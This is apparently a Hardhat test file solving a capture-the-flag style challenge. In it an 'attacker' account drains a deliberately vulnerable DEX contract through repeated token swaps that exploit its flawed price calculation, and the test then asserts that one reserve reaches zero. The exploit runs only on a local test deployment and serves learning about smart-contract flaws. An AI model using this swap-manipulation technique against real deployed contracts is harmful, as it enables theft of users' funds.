import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"
import { Dex } from "../typechain"

const CONTRACT_NAME = "Dex"
const CONTRACT_NAME_2 = "SwappableToken"

describe(CONTRACT_NAME, () => {
    let owner, attacker: SignerWithAddress
    let Dex, Token, dex, token1, token2: Contract
    let tx: TransactionResponse

    it("Should be possible to hack the basic DEX contract and stolen the funds by price manipulation", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        Dex = await ethers.getContractFactory(CONTRACT_NAME)
        dex = await Dex.deploy()
        await dex.deployed()

        Token = await ethers.getContractFactory(CONTRACT_NAME_2)
        token1 = await Token.deploy(dex.address, "TokenName1", "TKN1", 110)
        await token1.deployed()

        Token = await ethers.getContractFactory(CONTRACT_NAME_2)
        token2 = await Token.deploy(dex.address, "TokenName2", "TKN2", 110)
        await token2.deployed()

        await token1.transfer(attacker.address, 10)
        await token2.transfer(attacker.address, 10)

        await token1["approve(address,address,uint256)"](owner.address, dex.address, 100)
        await token2["approve(address,address,uint256)"](owner.address, dex.address, 100)

        await token1["approve(address,address,uint256)"](attacker.address, dex.address, 10000)
        await token2["approve(address,address,uint256)"](attacker.address, dex.address, 10000)

        await dex.setTokens(token1.address, token2.address)

        await dex.addLiquidity(token1.address, 100)
        await dex.addLiquidity(token2.address, 100)

        for (let i = 0; i < 50; i++) {
            await dex.connect(attacker).swap(token1.address, token2.address, 10)
            await dex.connect(attacker).swap(token2.address, token1.address, 10)
        }

        await dex.connect(attacker).swap(token1.address, token2.address, 40)
        // console.log(await token1.balanceOf(dex.address), await token2.balanceOf(dex.address))

        const token1DexBalanceAfter = await token1.balanceOf(dex.address)
        const token2DexBalanceAfter = await token2.balanceOf(dex.address)

        expect((Number(token1DexBalanceAfter) == 0) || (Number(token2DexBalanceAfter) == 0)).to.be.true
    })
})